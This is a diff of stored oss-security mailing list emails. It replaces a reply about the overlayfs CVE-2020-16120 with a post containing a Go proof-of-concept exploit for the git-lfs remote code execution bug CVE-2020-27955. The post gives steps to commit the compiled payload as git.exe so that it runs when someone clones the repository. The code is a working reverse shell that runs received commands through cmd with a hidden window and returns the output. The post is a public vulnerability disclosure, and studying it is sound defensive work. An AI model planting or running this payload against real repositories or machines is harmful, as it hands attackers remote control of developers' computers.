@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2060" "Wednesday" "14" "October" "2020" "13:14:31" "+0000" "Jordan Glover" "Golden_Miller83@protonmail.ch" "<oxqCR3d1ydEMwuGW3PBgnpgk9XUJjoqNeS5JCk7dcaEaQGJyq7TxVPJk2fWAgk9Bjd4MfdLDr_CHRPBTeJv9kRZPOV4X2b0HAALr17Vy5Wo=@protonmail.ch>" "61" "Re: [oss-security] CVE-2020-16120 - incorrect unprivileged overlayfs permission checking" nil nil nil "10" "2020101413:14:31" "[oss-security] CVE-2020-16120 - incorrect unprivileged overlayfs permission checking" (number mark "U       Golden_Mille Oct 14   61/2060  " thread-indent "\"Re: [oss-security] CVE-2020-16120 - incorrect unprivileged overlayfs permission checking\"\n") "<20201013171034.GA68820@nxnw.org>" ("<20201013171034.GA68820@nxnw.org>") nil nil nil nil nil nil nil "Re: [oss-security] CVE-2020-16120 - incorrect unprivileged overlayfs permission checking" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2090" "Wednesday" "4" "November" "2020" "23:26:40" "-0300" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzstg3moNw6mtorU6oR01hYAOL+diDSq4A1SK+AKzR8u7qg@mail.gmail.com>" "94" "[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn" nil nil nil "11" "2020110502:26:40" "[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn" (number mark "U       dawid@legalh Nov  4   94/2090  " thread-indent "\"[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit CVE-2020-27955 - Clone to Pwn" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14092 invoked by uid 550); 14 Oct 2020 16:51:24 -0000
+Received: (qmail 22135 invoked by uid 550); 5 Nov 2020 02:27:03 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,84 +12,132 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19937 invoked from network); 14 Oct 2020 13:14:47 -0000
-Date: Wed, 14 Oct 2020 13:14:31 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.ch;
-	s=protonmail; t=1602681275;
-	bh=+n7gYlTr0AuI62seDpchKmmNxG2HSr8geJpk7eqVljs=;
-	h=Date:To:From:Cc:Reply-To:Subject:In-Reply-To:References:From;
-	b=tFciNR5cFSI343uDJ0V58obJeK9q2Zbx/cCyYXZMKss4CmKwPkf7//auT6PosF1XK
-	 vEtjC1WS+vMUvVGtJ4sthPdhov0pkyn88JieZbKqmnwk1t0RSPrZavYAzci9R+Jaim
-	 k33/zl7m54KPlz34ZUscAunvIjx6ujqkPoPna/8g=
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-From: Jordan Glover <Golden_Miller83@protonmail.ch>
-Cc: "sbeattie@ubuntu.com" <sbeattie@ubuntu.com>
-Message-ID: <oxqCR3d1ydEMwuGW3PBgnpgk9XUJjoqNeS5JCk7dcaEaQGJyq7TxVPJk2fWAgk9Bjd4MfdLDr_CHRPBTeJv9kRZPOV4X2b0HAALr17Vy5Wo=@protonmail.ch>
-In-Reply-To: <20201013171034.GA68820@nxnw.org>
-References: <20201013171034.GA68820@nxnw.org>
+Received: (qmail 22105 invoked from network); 5 Nov 2020 02:27:02 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=2R/oRMwK1Q1C8ooX3lzBL62p97ol7euL5S8n1mHPvy0=;
+        b=grrnPYTIRrp60LCR7JC42IeuN6yx7wN+cfEmq3wVPrm4yzUNnRyEwmxE2WrIJmcRmf
+         eoQxjzhz9XaDrUaczMqavPVqKQEENi0RjtX40kBOuCHXr7O6no3NWwKRUEFBMJrt+cmY
+         1dfOA8LOwO379teDxk/fR6OYk+mvTbQdfvlX5/iDPm1b/49lxO5fSkKGqd5qOa6Bp3jq
+         fLnJAEi8fb/mMao1mkO3Jhx48XJe5ri+4EgVOih0vMDuE3Scf4oBVhxNKTFpUaxUlbaG
+         v4DpVWDni1Fat8NqgNV9KOWa3ABjqKsuQvW1VENrRaqIusJ8YwEucwcg9NX5tS8r1gWN
+         yqYQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=2R/oRMwK1Q1C8ooX3lzBL62p97ol7euL5S8n1mHPvy0=;
+        b=jLufUcovPXhdzXLQU6Tp4Vp/0GocjcmPHsUv7j/RSu3/zW4sqvKEV6E2KJJKRI3nLE
+         zwFpgQhYf8bdAdwc9kdLN57W2VJ0VeVo8vgwytHn5/2ZDx0FZiYdq2PJj+L35H4seBXM
+         Yur63AtNtXqRahcgynjVYJZIA2u6sCz2nRj4hkwfE38sq01Mgni5bhnoj6UXZW/TWEef
+         RPCwI+g6hrEqh2FkOJ9u6CcprcdtiwI1Q2lSOpNfLvOd+Z1kERimo0Ap1OLxdf+AKJKK
+         WHsMwHe1Bq9n3kmHxRdtXGomlhp/ZnwnOfODOywO4sfUA5P4kB3+ZWvB3ZvwBPDrqHsl
+         73DQ==
+X-Gm-Message-State: AOAM531z5uSK5HSSthd89F1jq/7f6cWV0qCKKeJdeCGiRVGyLWV+kTmn
+	wHsEu3gjlVwW+UewkBZOfrUs5L4f3WN9MsgHMHX3QnS6001194Jy43s=
+X-Google-Smtp-Source: ABdhPJx/iScXb8o5jY0mt+HBaldjA6/POjOjcJUDI27ItcZgsqiyQI/JoHIjJqRQj0tiQ3vGRrOMHlhjEzdW+tq7MkU=
+X-Received: by 2002:a17:906:a996:: with SMTP id jr22mr131324ejb.463.1604543210991;
+ Wed, 04 Nov 2020 18:26:50 -0800 (PST)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Subject: Re: [oss-security] CVE-2020-16120 - incorrect unprivileged overlayfs permission checking
+From: Dawid Golunski <dawid@legalhackers.com>
+Date: Wed, 4 Nov 2020 23:26:40 -0300
+Message-ID: <CADSYzstg3moNw6mtorU6oR01hYAOL+diDSq4A1SK+AKzR8u7qg@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] Git LFS (git-lfs) - Remote Code Execution (RCE) exploit
+ CVE-2020-27955 - Clone to Pwn
 
-On Tuesday, October 13, 2020 5:10 PM, Steve Beattie <steve.beattie@canonica=
-l.com> wrote:
+/*
+   Go PoC exploit for git-lfs -  Remote Code Execution (RCE)
+vulnerability CVE-2020-27955
+   git-lfs-RCE-exploit-CVE-2020-27955.go
 
-> Hello,
->
-> CVE-2020-16120 - incorrect unprivileged overlayfs permission checking
->
-> Giuseppe Scrivano discovered that overlayfs did not properly perform
-> permission checking when copying up files in an overlayfs, and can be
-> exploited from within a user namespace, if, for example, unprivileged
-> user namespaces are allowed.
->
-> An attacker can abuse this to get read access to files on the system
-> that they would not normally be permitted to access.
->
-> This likely only has an impact on Ubuntu kernels, where unprivileged
-> user namespaces are enabled by default.
+   Discovered by Dawid Golunski
+   https://legalhackers.com
+   https://exploitbox.io
 
-AFAIK unpriv user ns are enabled by default on vast majority of distros now=
-adays with debian (rhel?) being an exception (although this is going to cha=
-nge at some point[1]). I think what makes ubuntu different is unpriv overla=
-yfs which doesn't exist upstream thus in most other distros.
 
-[1] https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=3D898446
+   Affected (RCE exploit):
+   Git / GitHub CLI / GitHub Desktop / Visual Studio / GitKraken /
+SmartGit / SourceTree etc.
+   Basically the whole Windows dev world which uses git.
 
->
-> The following upstream commits address the issue:
->
-> 48bd024b8a40d73ad6b086de2615738da0c7004f ("ovl: switch to mounter creds i=
-n readdir")
-> 56230d956739b9cb1cbde439d76227d77979a04d ("ovl: verify permissions in ovl=
-_path_open()")
-> 05acefb4872dae89e772729efb194af754c877e8 ("ovl: check permission to open =
-real file")
->
-> The following commits also may be desired or necessary:
->
-> 130fdbc3d1f9966dd4230709c30f3768bccd3065 ("ovl: pass correct flags for op=
-ening real directory")
-> 292f902a40c11f043a5ca1305a114da0e523eaa3 ("ovl: call secutiry hook in ovl=
-_real_ioctl()")
->
-> Mitigation on systems where unprivileged user namespaces are enabled
-> but not needed is to set the kernel.unprivileged_userns_clone sysctl
-> to 0. e.g.:
->
-> $ sudo sysctl kernel.unprivileged_userns_clone=3D0
->
-> and across reboots by adding a file in /etc/sysctl.d/ that contains:
->
-> kernel.unprivileged_userns_clone=3D0
+   Usage:
+   Compile: go build git-lfs-RCE-exploit-CVE-2020-27955.go
+   Save & commit as git.exe
 
-This will only work with out-of-tree patch included in distro kernel.
+   The payload should get executed automatically on git clone operation.
+   It spawns a reverse shell, or a calc.exe for testing (if it
+couldn't connect).
 
->
-> Thanks.
->
->
->
-> Steve Beattie
-> sbeattie@ubuntu.com
+   An lfs-enabled repository with lfs files may also be needed so that git-lfs
+gets invoked. This can be achieved with:
+
+   git lfs track "*.dat"
+   echo "fat bug file" > lfsdata.dat
+   git add .*
+   git add *
+   git commmit -m 'git-lfs exploit' -a
+
+   Check out the full advisory for details:
+
+   https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html
+   https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html
+
+   PoC video at:
+   https://youtu.be/tlptOf9w274
+
+ ** For testing purposes only **
+
+
+*/
+
+package main
+import (
+    "net"
+    "os/exec"
+    "bufio"
+    "syscall"
+)
+
+
+func revsh(host string) {
+
+    c, err := net.Dial("tcp", host)
+    if nil != err {
+    // Conn failed
+        if nil != c {
+            c.Close()
+        }
+        // Calc for testing purposes if no listener available
+        cmd := exec.Command("calc")
+        cmd.Run()
+        return
+    }
+
+    r := bufio.NewReader(c)
+    for {
+        runcmd, err := r.ReadString('\n')
+        if nil != err {
+            c.Close()
+            return
+        }
+        cmd := exec.Command("cmd", "/C", runcmd)
+        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        out, _ := cmd.CombinedOutput()
+        c.Write(out)
+    }
+}
+
+// Connect to netcat listener on local port 1337
+func main() {
+    revsh("localhost:1337")
+}
+
+
+-- 
+Regards,
+Dawid Golunski
+https://legalhackers.com
+https://ExploitBox.io
+t: @dawid_golunski
